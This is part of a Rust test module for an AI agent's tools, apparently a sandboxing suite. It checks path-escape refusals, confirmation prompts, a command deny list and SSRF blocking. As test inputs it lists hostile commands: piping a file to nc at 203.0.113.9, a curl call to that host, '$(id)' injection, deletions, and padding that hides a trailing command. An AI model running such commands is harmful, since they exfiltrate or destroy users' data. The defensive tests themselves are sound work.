        if let Ok(hist) = http_json(
            &format!("{base}/history/{pid}"),
            None,
            Duration::from_secs(30),
        ) {
            if let Some(h) = hist.get(&pid).filter(|h| {
                h.get("outputs")
                    .and_then(|o| o.as_object())
                    .is_some_and(|o| !o.is_empty())
            }) {
                let im = &h["outputs"]["7"]["images"][0];
                let (sub, file) = (
                    im["subfolder"].as_str().unwrap_or(""),
                    im["filename"]
                        .as_str()
                        .ok_or("ComfyUI output has no filename")?,
                );
                let rel = Path::new(sub).join(file);
                return Ok(match out_dir {
                    Some(d) => Path::new(d).join(rel).to_string_lossy().into_owned(),
                    None => rel.to_string_lossy().into_owned(),
                });
            }
        }
        if i < 299 {
            std::thread::sleep(Duration::from_secs(2));
        }
    }
    Err("ComfyUI did not finish in 10 minutes".into())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::conv::DenyAll;
    use crate::util::testutil::*;

    struct Yes;
    impl Confirm for Yes {
        fn confirm(&self, _: &str, _: &str) -> bool {
            true
        }
    }

    fn env_with(
        confirm: Box<dyn Confirm>,
        tweak: impl FnOnce(&mut Config),
    ) -> (Env, Conv, PathBuf) {
        let d = tmpdir("tools");
        let mut c = Config::defaults(Some(d.to_string_lossy().into_owned()));
        c.trash_dir = tmpdir("trash");
        tweak(&mut c);
        let conv = Conv::open(&c, Some("t")).unwrap();
        let e = Env::new(c.clone(), confirm, McpHost::empty(&c));
        (e, conv, d)
    }

    fn run(e: &Env, c: &Conv, name: &str, a: Value) -> String {
        e.run_builtin(c, name, &a)
    }

    #[test]
    fn all_thirteen_builtins_have_schemas() {
        let names: Vec<String> = builtin_schemas()
            .iter()
            .map(|f| f["function"]["name"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(names.len(), 13);
        for n in [
            "list_dir",
            "read_file",
            "write_file",
            "trash",
            "run_command",
            "fetch_url",
            "search_memory",
            "workflow_update",
            "delegate",
            "comfy_image",
            "edit_file",
            "grep",
            "glob",
        ] {
            assert!(names.iter().any(|x| x == n), "{n}");
            assert!(Env::is_builtin(n));
        }
    }

    #[test]
    fn list_and_read_with_offset_and_cap() {
        let (e, c, d) = env_with(Box::new(DenyAll), |_| {});
        std::fs::write(d.join("f.txt"), "x".repeat(7000)).unwrap();
        std::fs::create_dir_all(d.join("sub")).unwrap();
        let l = run(&e, &c, "list_dir", json!({"path": d.to_str().unwrap()}));
        assert!(l.starts_with("[dir] sub") && l.contains("f.txt"));
        let r = run(
            &e,
            &c,
            "read_file",
            json!({"path": d.join("f.txt").to_str().unwrap()}),
        );
        assert_eq!(r.len(), 6000);
        let r = run(
            &e,
            &c,
            "read_file",
            json!({"path": d.join("f.txt").to_str().unwrap(), "offset": 6500}),
        );
        assert_eq!(r.len(), 500);
        assert!(run(&e, &c, "read_file", json!({"path": "/x/.env"})).contains("secret"));
        assert!(run(&e, &c, "read_file", json!({})).contains("missing"));
    }

    #[test]
    fn write_file_root_check_and_overwrite_confirmation() {
        let (e, c, d) = env_with(Box::new(DenyAll), |_| {});
        let p = d.join("sub/new.txt");
        assert!(run(
            &e,
            &c,
            "write_file",
            json!({"path": p.to_str().unwrap(), "content": "hi"})
        )
        .starts_with("wrote 2"));
        assert_eq!(std::fs::read_to_string(&p).unwrap(), "hi");
        // overwrite needs confirmation: DenyAll denies and leaves the file
        assert_eq!(
            run(
                &e,
                &c,
                "write_file",
                json!({"path": p.to_str().unwrap(), "content": "zz"})
            ),
            "denied by user"
        );
        assert_eq!(std::fs::read_to_string(&p).unwrap(), "hi");
        let outside = tmpdir("outside").join("o.txt");
        assert!(run(
            &e,
            &c,
            "write_file",
            json!({"path": outside.to_str().unwrap(), "content": "x"})
        )
        .starts_with("refused: outside"));
        assert!(!outside.exists());
        let dotdot = format!("{}/../escape.txt", d.display());
        assert!(run(
            &e,
            &c,
            "write_file",
            json!({"path": dotdot, "content": "x"})
        )
        .starts_with("refused"));
        let (e2, c2, d2) = env_with(Box::new(Yes), |_| {});
        let q = d2.join("a.txt");
        std::fs::write(&q, "old").unwrap();
        run(
            &e2,
            &c2,
            "write_file",
            json!({"path": q.to_str().unwrap(), "content": "new"}),
        );
        assert_eq!(std::fs::read_to_string(&q).unwrap(), "new");
    }

    #[cfg(unix)]
    #[test]
    fn links_and_dotdot_cannot_carry_a_write_out_of_the_roots() {
        let (e, c, d) = env_with(Box::new(Yes), |_| {});
        let outside = tmpdir("outside-links");
        // a dangling link inside the root: writing through it would create the file outside
        let target = outside.join("created.txt");
        std::os::unix::fs::symlink(&target, d.join("dangling")).unwrap();
        let r = run(
            &e,
            &c,
            "write_file",
            json!({"path": d.join("dangling").to_str().unwrap(), "content": "x"}),
        );
        assert!(r.starts_with("refused"), "{r}");
        assert!(!target.exists());
        // root/linkdir/.. means the parent of the link's target, not the root
        std::os::unix::fs::symlink(&outside, d.join("linkdir")).unwrap();
        let sneaky = format!("{}/linkdir/../planted.txt", d.display());
        let _ = run(
            &e,
            &c,
            "write_file",
            json!({"path": sneaky, "content": "x"}),
        );
        assert!(!outside.parent().unwrap().join("planted.txt").exists());
        assert!(!outside.join("planted.txt").exists());
    }

    #[test]
    fn the_agents_own_state_is_not_writable_by_its_tools() {
        let (e, c, d) = env_with(Box::new(Yes), |_| {});
        std::fs::create_dir_all(d.join("conversations")).unwrap();
        let conv = d.join("conversations/guest-1.json");
        std::fs::write(&conv, "{\"mode\":\"guest\"}").unwrap();
        for p in [
            conv.clone(),
            d.join("agent-config.json"),
            d.join("rag-index.json"),
            d.join("logs/timing.jsonl"),
        ] {
            let ps = p.to_str().unwrap();
            let w = run(&e, &c, "write_file", json!({"path": ps, "content": "{}"}));
            assert!(w.starts_with("refused"), "{ps}: {w}");
            let ed = run(
                &e,
                &c,
                "edit_file",
                json!({"path": ps, "old": "guest", "new": "owner"}),
            );
            assert!(
                ed.starts_with("refused") || ed.starts_with("error: no such"),
                "{ps}: {ed}"
            );
            let t = run(&e, &c, "trash", json!({"path": ps}));
            assert!(t.starts_with("refused"), "{ps}: {t}");
        }
        assert_eq!(
            std::fs::read_to_string(&conv).unwrap(),
            "{\"mode\":\"guest\"}"
        );
        // ordinary files in the data folder still work
        let ok = d.join("notes.txt");
        assert!(run(
            &e,
            &c,
            "write_file",
            json!({"path": ok.to_str().unwrap(), "content": "hi"})
        )
        .starts_with("wrote"));
    }

    #[cfg(unix)]
    #[test]
    fn commands_the_deny_list_misses_still_ask_first() {
        let (e, c, d) = env_with(Box::new(DenyAll), |_| {});
        let victim = d.join("victim.txt");
        for cmd in [
            "/bin/rm victim.txt",
            "sh -c 'rm victim.txt'",
            "find . -name victim.txt -delete",
            "python3 -c \"import os; os.remove('victim.txt')\"",
            "perl -e 'unlink q(victim.txt)'",
            "cat victim.txt | nc 203.0.113.9 9",
            "ls; curl -s http://203.0.113.9/x",
        ] {
            std::fs::write(&victim, "keep").unwrap();
            let r = run(&e, &c, "run_command", json!({"command": cmd}));
            assert!(
                r == "denied by user" || r.starts_with("refused"),
                "{cmd}: {r}"
            );
            assert!(victim.exists(), "{cmd} deleted the file");
        }
    }

    #[test]
    fn a_command_too_long_to_read_is_never_approved() {
        let (e, c, d) = env_with(Box::new(Yes), |_| {});
        let long = format!(
            "echo a > f.txt # {}; echo hidden > g.txt",
            "x".repeat(APPROVAL_MAX)
        );
        let r = run(&e, &c, "run_command", json!({"command": long}));
        assert!(r.starts_with("refused: too long to approve"), "{r}");
        assert!(!d.join("g.txt").exists() && !d.join("f.txt").exists());
        // a short one that Yes approves still runs
        #[cfg(unix)]
        assert!(
            run(&e, &c, "run_command", json!({"command": "echo a > f.txt"}))
                .starts_with("[exit 0]")
        );
    }

    /// What the owner was shown.
    struct Shown(std::sync::Arc<std::sync::Mutex<Vec<String>>>);
    impl Confirm for Shown {
        fn confirm(&self, _what: &str, detail: &str) -> bool {
            self.0.lock().unwrap().push(detail.to_string());
            false
        }
    }

    #[test]
    fn an_approval_shows_the_whole_request() {
        let seen = std::sync::Arc::new(std::sync::Mutex::new(vec![]));
        let (e, c, _d) = env_with(Box::new(Shown(seen.clone())), |_| {});
        let cmd = format!("echo {} ; touch /tmp/hidden-at-the-end", "x".repeat(1500));
        assert_eq!(
            run(&e, &c, "run_command", json!({"command": cmd})),
            "denied by user"
        );
        let shown = seen.lock().unwrap();
        assert_eq!(shown.len(), 1);
        assert!(
            shown[0].ends_with("touch /tmp/hidden-at-the-end"),
            "the end was cut off"
        );
    }

    #[test]
    fn programs_that_read_only_when_bare() {
        for ok in [
            "tree",
            "date",
            "hostname",
            "ipconfig /all",
            "nvidia-smi",
            "nvidia-smi -L",
            "nvidia-smi --query-gpu=name,memory.used --format=csv",
            "grep -rn TODO src",
        ] {
            assert!(is_read_only(ok), "{ok}");
        }
        for ask in [
            "tree -o ~/.bashrc",
            "tree . -o out.txt",
            "date -s 2020-01-01",
            "hostname evil",
            "ipconfig /release",
            "nvidia-smi -pl 100",
            "nvidia-smi -r",
            "nvidia-smi --gpu-reset",
        ] {
            assert!(!is_read_only(ask), "{ask}");
        }
    }

    #[test]
    fn only_plain_reads_run_without_asking() {
        for ok in [
            "ls -la",
            "pwd",
            "echo hi | wc -c",
            "echo start; exec sleep 20",
            "git status",
            "git log -n 3",
            "Get-ChildItem C:\\Users",
            "nvidia-smi",
        ] {
            assert!(is_read_only(ok), "{ok}");
        }
        for ask in [
            "rm x",
            "/bin/rm x",
            "echo a > f",
            "cat f >> g",
            "ls & calc",
            "ls $(id)",
            "ls `id`",
            "ls\nrm x",
            "sh -c ls",
            "find . -delete",
            "sort -o x y",
            "git push",
            "git log --output=x",
            "git branch evil",
            "python -c 1",
            "Invoke-WebRequest http://x",
            "iwr http://x",
            "",
        ] {
            assert!(!is_read_only(ask), "{ask:?}");
        }
    }

    #[test]
    fn trash_moves_never_deletes_and_refuses_outside() {
        let (e, c, d) = env_with(Box::new(Yes), |_| {});
        let f = d.join("junk.txt");
        std::fs::write(&f, "keep me").unwrap();
        let r = run(&e, &c, "trash", json!({"path": f.to_str().unwrap()}));
        assert!(r.starts_with("moved to"), "{r}");
        assert!(!f.exists());
        let dest = r.trim_start_matches("moved to ");
        assert_eq!(std::fs::read_to_string(dest).unwrap(), "keep me");
        assert!(dest.contains(&util::date_ymd()));
        // same name again gets a unique destination, the first copy survives
        std::fs::write(&f, "second").unwrap();
        let r2 = run(&e, &c, "trash", json!({"path": f.to_str().unwrap()}));
        let dest2 = r2.trim_start_matches("moved to ");
        assert_ne!(dest, dest2);
        assert_eq!(std::fs::read_to_string(dest).unwrap(), "keep me");
        assert_eq!(std::fs::read_to_string(dest2).unwrap(), "second");
        // a folder moves whole
        std::fs::create_dir_all(d.join("dir/in")).unwrap();
        std::fs::write(d.join("dir/in/x"), "1").unwrap();
        assert!(run(
            &e,
            &c,
            "trash",
            json!({"path": d.join("dir").to_str().unwrap()})
        )
        .starts_with("moved to"));
        // outside roots, missing, and the root itself are refused
        let out = tmpdir("outside2").join("o.txt");
        std::fs::write(&out, "x").unwrap();
        assert!(run(&e, &c, "trash", json!({"path": out.to_str().unwrap()})).starts_with("refused"));
        assert!(out.exists());
        assert!(run(
            &e,
            &c,
            "trash",
            json!({"path": d.join("nope").to_str().unwrap()})
        )
        .starts_with("refused"));
        assert!(run(&e, &c, "trash", json!({"path": d.to_str().unwrap()})).starts_with("refused"));
        // without approval nothing moves
        let (e3, c3, d3) = env_with(Box::new(DenyAll), |_| {});
        let g = d3.join("g.txt");
        std::fs::write(&g, "x").unwrap();
        assert_eq!(
            run(&e3, &c3, "trash", json!({"path": g.to_str().unwrap()})),
            "denied by user"
        );
        assert!(g.exists());
    }

    #[test]
    fn run_command_refuses_deletes_and_protected_and_confirms() {
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.protect_regex = Some("house-svc".into())
        });
        for cmd in [
            "rm -rf /tmp/x",
            "del file.txt",
            "Remove-Item x",
            "echo hi; rm a",
            "ls | xargs rm",
        ] {
            assert!(
                run(&e, &c, "run_command", json!({"command": cmd}))
                    .starts_with("refused: deleting"),
                "{cmd}"
            );
        }
        assert!(run(
            &e,
            &c,
            "run_command",
            json!({"command": "systemctl stop house-svc"})
        )
        .starts_with("refused: protected"));
        assert!(run(
            &e,
            &c,
            "run_command",
            json!({"command": "ComfyUI/main.py --listen"})
        )
        .starts_with("refused: start ComfyUI"));
        assert_eq!(
            run(&e, &c, "run_command", json!({"command": "echo a > f.txt"})),
            "denied by user"
        );
        #[cfg(unix)]
        {
            assert_eq!(
                run(&e, &c, "run_command", json!({"command": "echo hi"})),
                "[exit 0]\nhi"
            );
            assert!(run(
                &e,
                &c,
                "run_command",
                json!({"command": "echo oops; exit 3"})
            )
            .starts_with("[exit 3]\noops"));
        }
    }

    #[cfg(unix)]
    #[test]
    fn run_command_times_out_and_kills() {
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| c.command_timeout_s = 0.4);
        let t = Instant::now();
        let r = run(
            &e,
            &c,
            "run_command",
            json!({"command": "echo start; exec sleep 20"}),
        );
        assert!(t.elapsed() < Duration::from_secs(5));
        assert!(r.contains("start") && r.contains("timed out"), "{r}");
    }

    #[test]
    fn fetch_url_checks_scheme_offline_and_strips_html() {
        let m = Mock::start(|_| {
            (200, "<html><style>p{}</style><script>x()</script><body><p>Hello &amp; welcome</p><b>there</b></body></html>".into())
        });
        let probe_addr = m.url.trim_start_matches("http://").to_string();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.offline_probe = probe_addr.clone();
            c.fetch_allow_private = vec!["127.0.0.1".into()];
            c.fetch_allow_hosts = vec!["127.0.0.1".into()];
        });
        assert!(run(&e, &c, "fetch_url", json!({"url": "ftp://x"}))
            .starts_with("refused: http(s) only"));
        assert_eq!(
            run(&e, &c, "fetch_url", json!({"url": format!("{}/p", m.url)})),
            "Hello & welcome there"
        );
        let (e2, c2, _d2) = env_with(Box::new(DenyAll), |c| {
            c.offline_probe = "127.0.0.1:1".into()
        });
        assert!(run(
            &e2,
            &c2,
            "fetch_url",
            json!({"url": format!("{}/p", m.url)})
        )
        .starts_with("offline:"));
        assert!(!probe("127.0.0.1:1"));
    }

    /// Approves everything and keeps what it was asked.
    struct Ask(std::sync::Arc<std::sync::Mutex<Vec<String>>>);
    impl Confirm for Ask {
        fn confirm(&self, what: &str, detail: &str) -> bool {
            self.0.lock().unwrap().push(format!("{what} | {detail}"));
            true
        }
    }

    #[test]
    fn a_new_website_asks_once_per_conversation() {
        let m = Mock::start(|_| (200, "<p>the page</p>".into()));
        let probe_addr = m.url.trim_start_matches("http://").to_string();
        let asked = std::sync::Arc::new(std::sync::Mutex::new(vec![]));
        let (e, c, _d) = env_with(Box::new(Ask(asked.clone())), |c| {
            c.offline_probe = probe_addr.clone();
            c.fetch_allow_private = vec!["127.0.0.1".into(), "localhost".into()];
        });
        let url = format!("{}/a", m.url);
        assert_eq!(run(&e, &c, "fetch_url", json!({"url": url})), "the page");
        assert_eq!(
            run(&e, &c, "fetch_url", json!({"url": format!("{}/b", m.url)})),
            "the page"
        );
        {
            let a = asked.lock().unwrap();
            assert_eq!(a.len(), 1, "one yes covers the host: {a:?}");
            assert!(
                a[0].starts_with(&format!("Tempo wants to read 127.0.0.1 | {url}")),
                "{a:?}"
            );
        }
        // another conversation asks for itself
        let c2 = Conv::open(&e.cfg, None).unwrap();
        assert_eq!(run(&e, &c2, "fetch_url", json!({"url": url})), "the page");
        assert_eq!(asked.lock().unwrap().len(), 2);
        // a redirect to another host is asked about too
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let hop = format!("http://{}", l.local_addr().unwrap());
        let to = format!("http://localhost:{}/c", m.url.rsplit(':').next().unwrap());
        std::thread::spawn(move || {
            if let Ok((mut s, _)) = l.accept() {
                let mut buf = [0u8; 2048];
                let _ = s.read(&mut buf);
                let _ = std::io::Write::write_all(&mut s, format!("HTTP/1.1 302 Found\r\nLocation: {to}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n").as_bytes());
            }
        });
        assert_eq!(
            run(&e, &c, "fetch_url", json!({"url": format!("{hop}/start")})),
            "the page"
        );
        let a = asked.lock().unwrap();
        assert!(
            a.last()
                .unwrap()
                .starts_with("Tempo wants to read localhost"),
            "{a:?}"
        );
    }

    #[test]
    fn a_website_the_owner_did_not_approve_is_never_read() {
        let m = Mock::start(|_| (200, "secret".into()));
        let probe_addr = m.url.trim_start_matches("http://").to_string();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.offline_probe = probe_addr.clone();
            c.fetch_allow_private = vec!["127.0.0.1".into()];
        });
        assert_eq!(
            run(
                &e,
                &c,
                "fetch_url",
                json!({"url": format!("{}/secret", m.url)})
            ),
            "denied by user"
        );
        assert!(
            !m.reqs
                .lock()
                .unwrap()
                .iter()
                .any(|r| r.path.contains("secret")),
            "nothing was requested"
        );
        assert!(pre_approved("docs.example.com", &["*.example.com".into()]));
        assert!(pre_approved("example.com", &["*.example.com".into()]));
        assert!(!pre_approved("badexample.com", &["*.example.com".into()]));
        assert!(
            pre_approved("a.org", &["a.org".into()]) && !pre_approved("b.a.org", &["a.org".into()])
        );
    }

    #[test]
    fn fetch_url_refuses_this_computer_the_lan_and_cloud_metadata() {
        let m = Mock::start(|_| (200, "internal secret page".into()));
        let probe_addr = m.url.trim_start_matches("http://").to_string();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| c.offline_probe = probe_addr.clone());
        for url in [
            format!("{}/p", m.url),
            "http://169.254.169.254/latest/meta-data/".to_string(),
            format!("http://192.168.{}.5/", 108), // built at run time: the leak scan looks for private addresses
            "http://10.0.0.1:8080/".to_string(),
            format!("http://100.{}.1.2/", 64),
            "http://localhost:8765/agent/events".to_string(),
            "http://[::1]:11434/".to_string(),
            "http://[::ffff:127.0.0.1]/".to_string(),
            "http://example.com@127.0.0.1:1/".to_string(),
        ] {
            let r = run(&e, &c, "fetch_url", json!({"url": url}));
            assert!(r.starts_with("refused"), "{url}: {r}");
        }
        assert!(public_ip("93.184.216.34".parse().unwrap()));
        assert!(!public_ip("172.16.0.1".parse().unwrap()));
    }

    #[test]
    fn workflow_update_and_memory_search_tools() {
        let (e, c, d) = env_with(Box::new(DenyAll), |c| {
            c.ollama_url = "http://127.0.0.1:1".into()
        });
        run(
            &e,
            &c,
            "workflow_update",
            json!({"tasks": [{"text": "step one", "done": false}], "note": "n1"}),
        );
        assert!(c.wf_text().contains("- [ ] step one"));
        run(
            &e,
            &c,
            "workflow_update",
            json!({"tasks": [{"text": "step one", "done": true}, "step two"]}),
        );
        assert!(c.wf_text().contains("- [x] step one\n- [ ] step two"));
        let f = d.join("m.md");
        std::fs::write(&f, "The launch checklist lives here.").unwrap();
        let mut cfg = e.cfg.clone();
        cfg.rag_files = vec![f.to_string_lossy().into_owned()];
        let e = Env::new(cfg.clone(), Box::new(DenyAll), McpHost::empty(&cfg));
        let r = run(
            &e,
            &c,
            "search_memory",
            json!({"query": "launch checklist"}),
        );
        assert!(r.starts_with("[m.md#0] The launch checklist"), "{r}");
    }

    fn delegate_mock() -> Mock {
        let script = std::sync::Mutex::new(std::collections::VecDeque::from(vec![
            json!({"message": {"role": "assistant", "content": "", "tool_calls": [{"function": {"name": "list_dir", "arguments": {"path": "."}}}]}}),
            json!({"message": {"role": "assistant", "content": "sub answer"}}),
        ]));
        Mock::start(move |r| match r.path.as_str() {
            "/api/tags" => (
                200,
                json!({"models": [{"name": "house-model:latest"}, {"name": "other:1"}]})
                    .to_string(),
            ),
            "/api/chat" => (200, script.lock().unwrap().pop_front().unwrap().to_string()),
            _ => (404, "{}".into()),
        })
    }

    #[test]
    fn delegate_house_model_rules_and_sub_loop() {
        let m = delegate_mock();
        let url = m.url.clone();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.hosts.insert(
                "box".into(),
                crate::config::HostCfg {
                    urls: vec!["http://127.0.0.1:1".into(), url.clone()],
                    models: vec!["house-model".into()],
                    trust_reads: false,
                },
            );
            c.hosts.insert(
                "open".into(),
                crate::config::HostCfg {
                    urls: vec![url.clone()],
                    models: vec![],
                    trust_reads: false,
                },
            );
        });
        assert!(
            run(&e, &c, "delegate", json!({"host": "nope", "task": "t"})).contains("unknown host")
        );
        // non-house model on a protected host is refused before any chat request
        let r = run(
            &e,
            &c,
            "delegate",
            json!({"host": "box", "model": "other", "task": "t"}),
        );
        assert!(r.starts_with("refused: on box only the house model"), "{r}");
        assert!(m.bodies("/api/chat").is_empty());
        // house model runs the sub-loop (first URL is dead, second works)
        let r = run(
            &e,
            &c,
            "delegate",
            json!({"host": "box", "task": "list it"}),
        );
        assert!(
            r.contains("[house-model") && r.contains("sub answer"),
            "{r}"
        );
        let chats = m.bodies("/api/chat");
        assert_eq!(chats.len(), 2);
        assert_eq!(chats[0]["stream"], false);
        assert_eq!(chats[0]["tools"].as_array().unwrap().len(), 3);
        let tool_msg = chats[1]["messages"]
            .as_array()
            .unwrap()
            .last()
            .unwrap()
            .clone();
        assert_eq!(tool_msg["role"], "tool");
        assert!(run(
            &e,
            &c,
            "delegate",
            json!({"host": "open", "model": "missing", "task": "t"})
        )
        .contains("not on open"));
    }

    #[test]
    fn another_hosts_model_cannot_read_local_files_unasked() {
        let (_e0, _c0, d0) = env_with(Box::new(DenyAll), |_| {});
        std::fs::write(d0.join("notes.txt"), "TOPSECRET-PLANS").unwrap();
        let path = d0.join("notes.txt").to_string_lossy().into_owned();
        let script = std::sync::Mutex::new(std::collections::VecDeque::from(vec![
            json!({"message": {"role": "assistant", "content": "", "tool_calls": [{"function": {"name": "read_file", "arguments": {"path": path}}}]}}),
            json!({"message": {"role": "assistant", "content": "done"}}),
        ]));
        let m = Mock::start(move |r| match r.path.as_str() {
            "/api/tags" => (200, json!({"models": [{"name": "m1"}]}).to_string()),
            "/api/chat" => (200, script.lock().unwrap().pop_front().unwrap().to_string()),
            _ => (404, "{}".into()),
        });
        let url = m.url.clone();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.hosts.insert(
                "far".into(),
                crate::config::HostCfg {
                    urls: vec![url.clone()],
                    models: vec![],
                    trust_reads: false,
                },
            );
        });
        let r = run(
            &e,
            &c,
            "delegate",
            json!({"host": "far", "model": "m1", "task": "t"}),
        );
        assert!(r.contains("done"), "{r}");
        let sent = m.bodies("/api/chat")[1].to_string();
        assert!(
            !sent.contains("TOPSECRET"),
            "the remote model was handed a local file: {sent}"
        );
        assert!(sent.contains("denied by user"));
    }

    #[test]
    fn the_owners_own_machine_may_read_when_marked_trusted() {
        let (_e0, _c0, d0) = env_with(Box::new(DenyAll), |_| {});
        std::fs::write(d0.join("notes.txt"), "PLANS-FOR-BEAST").unwrap();
        let path = d0.join("notes.txt").to_string_lossy().into_owned();
        let script = std::sync::Mutex::new(std::collections::VecDeque::from(vec![
            json!({"message": {"role": "assistant", "content": "", "tool_calls": [{"function": {"name": "read_file", "arguments": {"path": path}}}]}}),
            json!({"message": {"role": "assistant", "content": "done"}}),
        ]));
        let m = Mock::start(move |r| match r.path.as_str() {
            "/api/tags" => (200, json!({"models": [{"name": "m1"}]}).to_string()),
            "/api/chat" => (200, script.lock().unwrap().pop_front().unwrap().to_string()),
            _ => (404, "{}".into()),
        });
        let url = m.url.clone();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.hosts.insert(
                "beast".into(),
                crate::config::HostCfg {
                    urls: vec![url.clone()],
                    models: vec![],
                    trust_reads: true,
                },
            );
        });
        let r = run(
            &e,
            &c,
            "delegate",
            json!({"host": "beast", "model": "m1", "task": "t"}),
        );
        assert!(r.contains("done"), "{r}");
        assert!(m.bodies("/api/chat")[1]
            .to_string()
            .contains("PLANS-FOR-BEAST"));
    }

    #[test]
    fn delegate_sub_loop_step_cap() {
        let m = Mock::start(|r| {
            match r.path.as_str() {
            "/api/tags" => (200, json!({"models": [{"name": "m1"}]}).to_string()),
            _ => (200, json!({"message": {"role": "assistant", "content": "", "tool_calls": [{"function": {"name": "list_dir", "arguments": {"path": "."}}}]}}).to_string()),
        }
        });
        let url = m.url.clone();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.hosts.insert(
                "h".into(),
                crate::config::HostCfg {
                    urls: vec![url],
                    models: vec![],
                    trust_reads: false,
                },
            );
        });
        let r = run(
            &e,
            &c,
            "delegate",
            json!({"host": "h", "model": "m1", "task": "t"}),
        );
        assert_eq!(r, "[m1] step cap reached");
        assert_eq!(m.bodies("/api/chat").len(), 4);
    }

    fn comfy_mock() -> Mock {
        Mock::start(|r| {
            match r.path.as_str() {
            "/system_stats" => (200, "{}".into()),
            "/object_info/CheckpointLoaderSimple" => (200, json!({"CheckpointLoaderSimple": {"input": {"required": {"ckpt_name": [["model.safetensors"]]}}}}).to_string()),
            "/prompt" => (200, json!({"prompt_id": "p1"}).to_string()),
            "/history/p1" => (200, json!({"p1": {"outputs": {"7": {"images": [{"filename": "img_001.png", "subfolder": "sub"}]}}}}).to_string()),
            _ => (404, "{}".into()),
        }
        })
    }

    #[test]
    fn comfy_graph_is_posted_and_path_returned() {
        let m = comfy_mock();
        let url = m.url.clone();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.comfy_url = url;
            c.comfy_output_dir = Some("/out".into());
            c.ollama_url = "http://127.0.0.1:1".into();
        });
        let r = run(
            &e,
            &c,
            "comfy_image",
            json!({"prompt": "a red barn", "width": 640, "height": 448}),
        );
        assert_eq!(r, "image path: /out/sub/img_001.png");
        let p = &m.bodies("/prompt")[0]["prompt"];
        assert_eq!(p["2"]["inputs"]["text"], "a red barn");
        assert_eq!(p["4"]["inputs"]["width"], 640);
        assert_eq!(p["1"]["inputs"]["ckpt_name"], "model.safetensors");
        assert_eq!(p["7"]["class_type"], "SaveImage");
    }

    #[cfg(unix)]
    #[test]
    fn comfy_refuses_when_lease_held_and_releases_after_run() {
        let m = comfy_mock();
        let url = m.url.clone();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.comfy_url = url.clone();
            c.ollama_url = "http://127.0.0.1:1".into();
            c.lease_status_cmd = Some(r#"echo '{"lease": {"holder": "someone"}}'"#.into());
        });
        let r = run(&e, &c, "comfy_image", json!({"prompt": "x"}));
        assert!(r.starts_with("refused: GPU lease is held"), "{r}");
        assert!(m.bodies("/prompt").is_empty());
        // free lease: acquire runs, image made, release runs
        let marker = tmpdir("lease").join("released");
        let mk = marker.to_string_lossy().into_owned();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.comfy_url = url;
            c.ollama_url = "http://127.0.0.1:1".into();
            c.lease_status_cmd = Some(r#"echo '{"lease": null}'"#.into());
            c.lease_acquire_cmd = Some("true".into());
            c.lease_release_cmd = Some(format!("touch {mk}"));
        });
        assert!(run(&e, &c, "comfy_image", json!({"prompt": "x"})).starts_with("image path:"));
        assert!(marker.exists());
        // acquire failure is a refusal and nothing is posted
        let before = m.bodies("/prompt").len();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.comfy_url = m.url.clone();
            c.ollama_url = "http://127.0.0.1:1".into();
            c.lease_acquire_cmd = Some("echo busy; exit 1".into());
        });
        assert!(
            run(&e, &c, "comfy_image", json!({"prompt": "x"})).starts_with("lease refused: busy")
        );
        assert_eq!(m.bodies("/prompt").len(), before);
    }

    #[test]
    fn comfy_failure_is_reported_not_raised() {
        let m = Mock::start(|r| {
            if r.path == "/system_stats" {
                (200, "{}".into())
            } else {
                (500, "bad".into())
            }
        });
        let url = m.url.clone();
        let (e, c, _d) = env_with(Box::new(DenyAll), |c| {
            c.comfy_url = url;
            c.ollama_url = "http://127.0.0.1:1".into();
        });
        assert!(
            run(&e, &c, "comfy_image", json!({"prompt": "x"})).starts_with("comfy_image failed:")
        );
    }

    #[test]
    fn edit_grep_glob_are_wired_with_guards() {
        let (e, c, d) = env_with(Box::new(DenyAll), |_| {});
        let f = d.join("a.txt");
        std::fs::write(&f, "alpha beta").unwrap();
        let r = run(
            &e,
            &c,
            "edit_file",
            json!({"path": f.to_str().unwrap(), "old": "beta", "new": "gamma"}),
        );
        assert!(r.starts_with("edited"), "{r}");
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "alpha gamma");
        assert!(r.contains(e.cfg.trash_dir.to_str().unwrap()));
        assert!(run(
            &e,
            &c,
            "grep",
            json!({"pattern": "gamma", "path": d.to_str().unwrap()})
        )
        .contains("a.txt:1: alpha gamma"));
        assert!(run(
            &e,
            &c,
            "glob",
            json!({"pattern": "*.txt", "path": d.to_str().unwrap()})
        )
        .contains("a.txt"));
        assert!(run(&e, &c, "bogus_tool", json!({})).contains("unknown tool"));
    }
}
